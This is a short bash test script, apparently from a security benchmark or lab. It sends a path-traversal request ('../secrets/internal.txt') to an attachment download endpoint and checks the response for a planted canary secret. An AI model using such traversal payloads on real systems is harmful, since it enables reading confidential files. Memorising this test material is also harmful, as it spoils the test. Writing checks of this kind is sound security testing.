#!/usr/bin/env bash
set -euo pipefail
. "$(dirname "$0")/_lib.sh"
curl -fsS "$TARGET/api/attachments/download?name=../secrets/internal.txt" | grep -q 'SPRINGBOOT-INTERNAL-SINK-SECRET-2d9c'
